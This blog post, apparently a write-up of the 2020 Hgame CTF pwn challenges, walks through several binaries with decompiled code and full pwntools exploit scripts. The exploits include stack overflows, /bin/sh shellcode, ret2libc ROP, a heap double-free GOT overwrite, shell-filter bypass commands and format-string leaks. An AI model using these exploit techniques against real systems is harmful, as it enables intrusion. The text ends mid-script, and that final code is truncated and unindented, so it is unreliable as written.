---
title: 2020 Hgame week1-week3 pwn writeup
top_img: >-
  https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/ea6503c45cfe7010dd038787933e588c.jpg
cover: >-
  https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/71ef703bb7b7ab2d64967afcf4dba9ac.jpg
date: 2020-02-12 00:25:42
tags: CTF,pwn
categories: CTF, pwn
keywords:
description:
comments:
toc:
toc_number:
copyright:
mathjax:
katex:
hide:
---

# 2020 Hgame 

Hgame是杭电在寒假期间举办的新生赛，持续时间长达四周，每周都会放出新题，越到后面难度越大。比赛好像是1月16号开始的，到2月14号结束（情人节？）...

![main_page](https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212004711.png)

## 前言

春节期间，在河北老家待着，十分无聊，又赶上新冠疫情蔓延，出家无望，此时[imagin](https://imagin.vip/)师傅对我说：

> 来打CTF鸭！

于是，错过注册日期的我，用imagin师傅的帐号来Hgame凑凑热闹，重新拾起我丢了多年的pwn...

## 比赛规则

1. 比赛分为线上赛（面向所有选手进行）与线下赛（仅面向部分校内选手）；
2. 所有选手均以个人为单位参赛；
3. 禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路等，对平台、参赛者或其他人员进行攻击等，违者分数作废并取消比赛资格；
4. 每周结束后，校内选手请发送该周题目的 Writeup 到 wp@vidar.club，截止时间为每周五晚上八点；
5. **在*每周五晚上八点*之前，请校内外的师傅们不要散播任何与上一周题目有关的题解、Flag；**
6. 每道题目的一、二、三血分别有 5%、 3%、1% 的额外分数加成。

## Week1 

我是大年三十开始做的，所以完美的错过了week1的比赛时间，不过还是做了做week1的pwn，就当是预习一下吧~

### Hard_AAAAA
 - 题目描述：无脑AAA太无聊了，挑战更高难度的无脑AAA！
 - 题目地址：[Hard_AAAAA](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week1_1/Hard_AAAAA)
 - 考察点：变量覆盖
 -  
 - 难度：入门
 - 分值：75
 - 完成人数：172

反汇编得到源码如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  char s; // [esp+0h] [ebp-ACh]
  char v5; // [esp+7Bh] [ebp-31h]
  unsigned int v6; // [esp+A0h] [ebp-Ch]
  int *v7; // [esp+A4h] [ebp-8h]

  v7 = &argc;
  v6 = __readgsdword(0x14u);
  alarm(8u);
  setbuf(_bss_start, 0);
  memset(&s, 0, 160u);
  puts("Let's 0O0o\\0O0!");
  gets(&s);
  if ( !memcmp("0O0o", &v5, 7u) )
    backdoor();
  return 0;
}
```

程序中存在后门`backdoor()`，开启后门的条件是变量`v5`等于`"0O0o"`，不难看出变量`s`其后便是变量`v5`，而`gets(&s)`由于没有检查`s`的长度，这将导致向`s`中输入过长的字符串时，覆盖掉变量`v5`的值，调试一下得到偏移量为123，所以只要输入`'a'*123+'0O0o'`即可启动后门，拿到shell。

#### exp

虽然没啥写脚本的必要，但是我写了个[脚本](https://github.com/TaQini/ctf/tree/master/script)，用来自动生成exp模板，就当是展示一下效果吧：

```python
#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './Hard_AAAAA'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# info
backdoor = 0x8048636

# gadget
# elf, libc

# rop1
offset = 123
payload = 'A'*offset
payload += '0O0o\0O0'

ru("Let's 0O0o\\0O0!\n")
# debug('b *0x080485FD')
sl(payload)

# debug()
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()
```



### Number_Killer

 - 题目描述：看起来人畜无害的一些整数也能秒我？(吃惊)
 - 题目地址：[Number_Killer](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week1_2/Number_Killer) 
 - 考察点：整数shellcode
 - 难度：简单
 - 分值：100
 - 完成人数：77

首先查看程序的保护方式：

```shell
% checksec Number_Killer 
[*] '/home/taqini/Desktop/ctf/hgame2020/pwn/week1_2/Number_Killer'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

什么保护都没有开，栈可执行，因此可以直接在栈中执行`shellcoode`

接下来分析程序，程序反编译结果如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  __int64 v4[11]; // [rsp+0h] [rbp-60h]
  int i; // [rsp+5Ch] [rbp-4h]

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  memset(v4, 0, 0x50uLL);
  puts("Let's Pwn me with numbers!");
  for ( i = 0; i <= 19; ++i )
    v4[i] = readll();
  return 0;
}
```

这里`v4`是个整数数组，长度为12，但是在for循环中却向`v4`中读了20个整数，因此将导致栈溢出。

用`gdb`调试程序，得到数组`v4`的首地址`v4 = 0x7fffffffda90`，以及返回地址` ret_addr = 0x7fffffffdaf8`，二者相差104个字节，由于`v4`存的整数`int64`类型，大小是8字节，因此读入13个整数后，将覆盖程序返回地址。

程序代码中有一个出题人给的`gift`函数：

```assembly
.text:0000000000400789 gift            proc near
.text:0000000000400789 ; __unwind {
.text:0000000000400789                 push    rbp
.text:000000000040078A                 mov     rbp, rsp
.text:000000000040078D                 jmp     rsp
.text:000000000040078D gift            endp
```

能直接利用其中的`gadget: jmp rsp`，将返回地址覆盖为`0x40078D`(gadget的地址)，把程序的控制流劫持到栈中。溢出发生是`rsp`的值正好是`v4`的首地址，因此向`v4`中布置`shellcode`即可。

这题有以下几点要注意：

- 只能输入13个整数，因此shellcode的长度应该小于104字节
- 需要将`shellcode`每8个字节转成一个`int64`，且在`readall()`存在检查，整数的长度不能超过20，因此需要寻找一个合适的`shellcode`，不能用`pwntool`自动生成

#### exp

```python
#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './Number_Killer'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# info
# gadget

jrsp = 0x0040078A

# elf, libc
# shellcode = asm(shellcraft.sh())
shellcode = '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05\x00\x00'

buf = 0x7fffffffda90
ret = 0x7fffffffdaf8

# rop1
ru('Let\'s Pwn me with numbers!\n')
for i in range(11):
    sl(str(i))
sl(str(0x0000000b00000000))
sl(str(0xdeadbeef))
sl(str(jrsp))

sh = []
for i in range(len(shellcode)/8):
    sh.append(u64(shellcode[8*i:8*i+8]))

for i in sh:
    print str(i),len(str(i))
    sl(str(i))

# debug('b *0x0000000000400766')
for i in range(3):
    sl('1')

p.interactive()
```



### One_Shot

 - 题目描述：一发入魂
 - 题目地址：[One_Shot](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week1_3/One_Shot)
 - 考察点：字符串截断
 - 难度：入门
 - 分值：100
 - 完成人数：119

反汇编分析程序：

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  _BYTE *v4; // [rsp+8h] [rbp-18h]
  int fd[2]; // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v4 = 0LL;
  *(_QWORD *)fd = open("./flag", 0, envp);
  setbuf(stdout, 0LL);
  read(fd[0], &flag, 0x1EuLL);
  puts("Firstly....What's your name?");
  __isoc99_scanf("%32s", &name);
  puts("The thing that could change the world might be a Byte!");
  puts("Take tne only one shot!");
  __isoc99_scanf("%d", &v4);
  *v4 = 1;
  puts("A success?");
  printf("Goodbye,%s", &name);
  return 0;
}
```

首先这题打开`/flag`文件并且把内容读到`flag`变量中，然后读一个32字节的字符串到`name`变量中，还给了一个**任意内存置1**的漏洞，最后打印`name`。

我们知道，在C语言中，字符串以末尾1字节的`\x00`作为结束的标志。如果打印字符串的函数没有遇到`\x00`字节，则会一直打印字符。

`name`和`flag`都定义在`bss`段，而且`flag`紧紧按着`name`：

```assembly
.bss:00000000006010C0 name            db    ? 
.bss:00000000006010E0 flag            db    ? 
```

因此利用**任意内存置1**漏洞，把`name`末尾的`\x00`置1，在程序打印`name`时，就会顺便把`flag`打印出来。

#### exp

```python
#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './One_Shot'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# info
# gadget
prdi = 0x00000000004008a3 # pop rdi ; ret

# elf, libc

# rop1

ru('name?\n')
sl('a'*31)
ru('shot!\n')
sl(str(0x6010e0-1))

# debug()
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()
```



### ROP_LEVEL0

 - 题目描述：ROP is PWNers' romance
 - 题目地址：[ROP_LEVEL0](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week1_4/ROP_LEVEL0)
 - 考察点：ROP攻击
 - 难度：简单
 - 分值：150 
 - 完成人数：88

`ROP`攻击的入门级别题目，非常适合新手学习。反汇编分析程序：

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  int v3; // eax
  char buf; // [rsp+0h] [rbp-50h]
  int v6; // [rsp+38h] [rbp-18h]
  int fd[2]; // [rsp+48h] [rbp-8h]

  memset(&buf, 0, 0x38uLL);
  v6 = 0;
  setbuf(_bss_start, 0LL);
  v3 = open("./some_life_experience", 0);
  *fd = v3;
  read(v3, &buf, 0x3CuLL);
  puts(&buf);
  read(0, &buf, 0x100uLL);
  return 0;
}
```

很明显的栈溢出，由于开了`ASLR`地址随机化保护，因此需要构造两个`ROP`链，第一个`ROP`链泄漏`libc`地址，第二个`ROP`用于 `ret2libc`，执行`system("/bin/sh")`获取shell。

至于`ROP`攻击，是比较基础的知识点，百度一下就能明白，这里就不赘述啦~

#### exp

```python
#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './ROP_LEVEL0'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc.so.6'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400753 # pop rdi ; ret
ppr = 0x0000000000400750 # pop r14 ; pop r15 ; ret

# elf, libc
puts_got = elf.got['puts']
puts_plt = elf.symbols['puts']
main = elf.symbols['main']

# rop1
offset = 88
payload = 'A'*offset
payload += p64(prdi) + p64(puts_got) + p64(puts_plt) + p64(main)

ru('./flag\n')
# debug()
sl(payload)

puts = u64(rc(6).ljust(8,'\0'))
info_addr('puts',puts)
libc_base = puts - libc.symbols['puts']
system = libc.symbols['system'] + libc_base
binsh = libc.search('/bin/sh').next() + libc_base
info_addr('system', system)
info_addr('binsh', binsh)

# rop2
payload2 = 'B'*offset
payload2 += p64(ppr) + p64(0)*2
payload2 += p64(prdi) + p64(binsh) + p64(system) + p64(main)
ru('./flag\n')
# debug()
sl(payload2)

# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()
```



## Week2

week2就有意思多了，各种预期解法和非预期解法都有...

Pwn本该这样，不该只有一种解法，思路灵活些总是没错的...

### findyourself

 - 题目描述：baby题有两种，这是第一种，虽然这题名字没有baby
 - 题目地址：[findyourself](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week2_1/fys)
 - 考察点：proc、shell基础、ls命令(非预期)
 - 难度：中等
 - 分值：150
 - 完成人数：37

#### 0x0 程序分析

面函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  char s1; // [rsp+0h] [rbp-90h]
  char buf; // [rsp+40h] [rbp-50h]
  unsigned __int64 v6; // [rsp+88h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init();
  memset(&buf, 0, 0x40uLL);
  getcwd(&buf, 0x40uLL);
  puts("where are you?");
  read_n(&s1, 64u);
  if ( strcmp(&s1, &buf) )
  {
    puts("nonono,not there");
    exit(0);
  }
  read_n(&s1, 20u);
  if ( check2(&s1) == -1 )
  {
    puts("oh,it's not good idea");
    exit(0);
  }
  close(1);
  close(2);
  system(&s1);
  return 0;
}
```

`init`函数:

```c
unsigned __int64 init(){
  int rand_pos; // [rsp+4h] [rbp-51Ch]
  int i; // [rsp+8h] [rbp-518h]
  int fd; // [rsp+Ch] [rbp-514h]
  int buf[52]; // [rsp+10h] [rbp-510h]
  char dir_list[1008]; // [rsp+E0h] [rbp-440h]
  char new_dir; // [rsp+4D0h] [rbp-50h]
  char command; // [rsp+4F0h] [rbp-30h]
  unsigned __int64 v8; // [rsp+518h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  fd = open("/dev/urandom", 0);
  rand_pos = 0;
  read(fd, &rand_pos, 1uLL);
  rand_pos %= 50;
  if ( fd < 0 )
    exit(-1);
  chdir("./tmp");
  for ( i = 0; i <= 49; ++i )
  {
    read(fd, &buf[i], 4uLL);
    snprintf(&dir_list[20 * i], 0x14uLL, "0x%x", buf[i]);
    mkdir(&dir_list[20 * i], 0x1EDu);
  }
  snprintf(&new_dir, 0x16uLL, "./%s", &dir_list[20 * rand_pos]);
  chdir(&new_dir);
  puts("find yourself");
  read_n(&command, 25u);
  if ( check1(&command) != -1 )
    system(&command);
  return __readfsqword(0x28u) ^ v8;
}
```

程序流程：

- 在/tmp/目录下创建50个文件夹，文件名随机，然后随机切换到一个文件夹中
- 一次执行`system(cmd1)`的机会，字符过滤规则为`check1`
- 随后，要输入正确的工作目录
- 又有一次执行`system(cmd2)`的机会，字符过滤规则为`check2`
- 但是这次执行`system`前关闭了`stdout`和`stderr`

#### 0x1 check1

 - 允许的字符：
	```c
    a b c d e f g h i j k l m n o p q r s t u v w x y z
    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
    /   -
   ```
 - 过滤的字符串
    ```c
    sh
    cat
    flag
    pwd
    export
    ```
    
- docker中能利用的命令不多，除了被过滤的`cat` 和`sh`之外，还有 `ls` 和`cd`

- `cd -`可以输出`OLD_PWD`，也就是`/`，但是并无有神马用处

- `ls`可以虽然可以输出当前路径下的文件名，但是题目中对比的是绝对路径

- 看了下`ls --help`，发现可以利用`ls -ali`，输出当前目录文件`.`的`inode`，记做`inodeX`好啦

- `inode`是唯一的，于是再开一个`shell`，`ls -alh /tmp`查看`/tmp/`下的所有文件名及`inode`

- 根据`inodeX`，即可找到正确的目录名

  ```shell
  # shell 1
  % nc 47.103.214.163 21000
  find yourself
  ls -ali
  total 8
  1968846 drwxr-xr-x   2 1000 1000 4096 Jan 27 12:50 .
  1968682 drwxrwxrwx 152    0    0 4096 Jan 27 12:50 ..
  where are you?
  ```

  ```shell
  # shell 2
  % nc 47.103.214.163 21000 | grep 1968846
  ls -ali /tmp
  1968846 drwxr-xr-x   2 1000 1000 4096 Jan 27 12:50 0x8eb79f31
  ```

  ```shell
  # shell 1
  % nc 47.103.214.163 21000
  find yourself
  ls -ali
  total 8
  1968846 drwxr-xr-x   2 1000 1000 4096 Jan 27 12:50 .
  1968682 drwxrwxrwx 152    0    0 4096 Jan 27 12:50 ..
  where are you?
  /tmp/0x8eb79f31
  ```

#### 0x2 check2

- 过滤的字符(串)

  ```c
  sh cat * & | > <
  ```

- 这个简单多了，字符串拼接即可绕过

  ```shell
  x=h;s$x
  ```


#### 0x3 close(1) and close(2)

- 关闭了`stdout`和`stderr`，即使`cat flag`也得不到输出`u_u`

- 于是，重定向，把`stdout`和`stderr`重定向到`stdin`

  ```shell
  cat /flag 1>&0
  ```

#### 0x4 fini

- 这题在`check1`卡了好久，第三天才想到`ls -i`，我太菜了。

#### 0x5 exp

```python
#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './fys'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

cmd1 = 'ls -ali'
ru('find yourself\n')
sl(cmd1)
print ru('where are you?\n')

cmd2 = 'a=t;b=ag;ca$a fl$b'

# debug()
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()
```

#### 0x6 官方解

- 这题本来的考察点`proc`，硬是让我用`ls -i`解出来了...还是要多学些东西...

- `check1` : `ls -l /proc/self/cwd` 

- `check2`: `$0` 

- 赶紧学习一波`/proc`

  ```
  % nc 47.103.214.163 21000
  find yourself
  ls -al /proc/self/
  total 0
  dr-xr-xr-x   9 1000 1000 0 Feb  1 09:44 .
  dr-xr-xr-x 121    0    0 0 Feb  1 09:42 ..
  dr-xr-xr-x   2 1000 1000 0 Feb  1 09:44 attr
  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 autogroup
  -r--------   1 1000 1000 0 Feb  1 09:44 auxv
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 cgroup
  --w-------   1 1000 1000 0 Feb  1 09:44 clear_refs
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 cmdline
  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 comm
  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 coredump_filter
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 cpuset
  lrwxrwxrwx   1 1000 1000 0 Feb  1 09:44 cwd -> /tmp/0xb3f14a49
  -r--------   1 1000 1000 0 Feb  1 09:44 environ
  lrwxrwxrwx   1 1000 1000 0 Feb  1 09:44 exe -> /bin/ls
  dr-x------   2 1000 1000 0 Feb  1 09:44 fd
  dr-x------   2 1000 1000 0 Feb  1 09:44 fdinfo
  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 gid_map
  -r--------   1 1000 1000 0 Feb  1 09:44 io
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 limits
  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 loginuid
  dr-x------   2 1000 1000 0 Feb  1 09:44 map_files
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 maps
  -rw-------   1 1000 1000 0 Feb  1 09:44 mem
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 mountinfo
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 mounts
  -r--------   1 1000 1000 0 Feb  1 09:44 mountstats
  dr-xr-xr-x   5 1000 1000 0 Feb  1 09:44 net
  dr-x--x--x   2 1000 1000 0 Feb  1 09:44 ns
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 numa_maps
  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 oom_adj
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 oom_score
  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 oom_score_adj
  -r--------   1 1000 1000 0 Feb  1 09:44 pagemap
  -r--------   1 1000 1000 0 Feb  1 09:44 patch_state
  -r--------   1 1000 1000 0 Feb  1 09:44 personality
  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 projid_map
  lrwxrwxrwx   1 1000 1000 0 Feb  1 09:44 root -> /
  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 sched
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 schedstat
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 sessionid
  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 setgroups
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 smaps
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 smaps_rollup
  -r--------   1 1000 1000 0 Feb  1 09:44 stack
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 stat
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 statm
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 status
  -r--------   1 1000 1000 0 Feb  1 09:44 syscall
  dr-xr-xr-x   3 1000 1000 0 Feb  1 09:44 task
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 timers
  -rw-rw-rw-   1 1000 1000 0 Feb  1 09:44 timerslack_ns
  -rw-r--r--   1 1000 1000 0 Feb  1 09:44 uid_map
  -r--r--r--   1 1000 1000 0 Feb  1 09:44 wchan
  where are you?
  /tmp/0xb3f14a49
  $0
  exec >&0
  cat /flag
  hgame{You_4re_So_C1EV3R}
  ```

  

### Roc826

 - 题目描述：不好好学C的话是很容易随手写出PWN题的
 - 题目地址：[Roc826](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week2_2/Roc826)
 - 考察点：`double free`、`unsorted bin leak`
 - 难度：入门
 - 分值：300
 - 完成人数：35

这题是堆的入门级别的题目，然鹅我并不会做堆的题，所以比赛时没做，后来照着官方wp赶紧学习一波

#### 0x0 背景姿势

- glibc (<2.27)堆分配的策略：即 first-fit。在分配内存时,malloc 会先到 unsorted bin(或者fastbins) 中查找适合的被 free 的 chunk,如果没有,就会把 unsorted bin 中的所有 chunk 分别放入到所属的 bins 中,然后再去这些 bins 里去找合适的 chunk。可以看到第三次 malloc 的地址和第一次相同,即 malloc 找到了第一次 free 掉的chunk,并把它重新分配。
- fast chunk表示正在使用的长度在`32-160`(32位系统是`16-80`)的堆块，而fastbin表示长度在`32-180`范围内的已经释放的堆块

#### 0x1 漏洞利用

- `unsorted bin leak` ：泄漏`main_arena`地址（即`__malloc_hook-0x68`）

- `double free`：`fastbin attack`覆写`free`的`got`表为`system`地址，或者改`free_hook`为`one_gadget`都可以`getshell`

#### 0x2 exp
  ```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './Roc826'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc-2.23.so'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def add(size,cont='aaaa'):
    sla(':','1')
    sla('size?\n',str(size))
    sla('content:',cont)

def delete(index):
    sla(':','2')
    sla('index?\n',str(index))

def show(index):
    sla(':','3')
    sla('index?\n',str(index))
    ru('content:')
    return ru('-----------------')

# info
# gadget
# elf, libc
add(0x80)
add(0x58)
add(0x58)
add(0x58,'/bin/sh\x00')

delete(0)
data = show(0)[:-1].ljust(8,'\0')
log.hexdump(data)
libcbase = u64(data) - libc.sym['__malloc_hook'] - 0x68
info_addr('libcbase',libcbase)

delete(1)
delete(2)
delete(1)
debug()
add(0x58,p64(0x601ffa)) # got[free]-14-16
add(0x58)
add(0x58)
add(0x58,'aaaaaaaaaaaaaa'+p64(libcbase+libc.sym['system'])[:6])

delete(3)

p.interactive()
  ```

 

### Another_Heaven

 - 题目描述：永遠と呼びたい 君に 出逢えた ことだけは（什么鬼...）
 - 题目地址：[Another_Heaven](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week2_3/Another_Heaven)
 - 考察点：GOT改写
 - 难度：简单
 - 分值：200
 - 完成人数：35

#### 0x0 程序分析

反汇编分析代码，发现有一个`Pxxxhub`的后门，可修改`1`字节任意内存：

```c
puts("There is a back door...\"Hacked by Annevi!\"");
*addr = readi();
read(0, *addr, 1uLL);
```

`init()`中读了`flag`，随后有个`strcmp`对比`password`与`flag`

```c
printf("Password:", account);
read_n(password, 48);
if ( !strcmp(password, flag) )
{
puts("Welcome!The emperor Qie!");
puts("|Recommended|Hottest|Most Viewed......");
result = 0;
}
```

#### 漏洞利用

用修改`1`字节任意内存的后门改写`GOT`表，把`strcmp`改为`printf`

然后就是骚操作了：读`password`时，输入`%s`，这时候：

> `strcmp(password, flag)`相当于`printf("%s",flag)`

```shell
% nc 47.103.214.163 21001
There is a back door..."Hacked by Annevi!"
6299752
&
==========================================
____
|  _ \ ___  _ __ _ __ | | | |_   _| |__  
| |_) / _ \| '__| '_ \| |_| | | | | '_ \ 
|  __/ (_) | |  | | | |  _  | |_| | |_) |
|_|   \___/|_|  |_| |_|_| |_|\__,_|_.__/ 

==========================================
Login System
Account:Password:%s
hgame{VGhlX2Fub3RoZXJfd2F5X3RvX2hlYXZlbg==}Wrong Password!
Forgot your password?(y/n)
```

#### exp

```python
#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './Another_Heaven'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

if len(sys.argv) == 1:
p = process(local_file)
libc = ELF(local_libc)
elif len(sys.argv) > 1:
if len(sys.argv) == 3:
host = sys.argv[1]
port = sys.argv[2]
else:
host, port = sys.argv[1].split(':')
p = remote(host, port)
libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
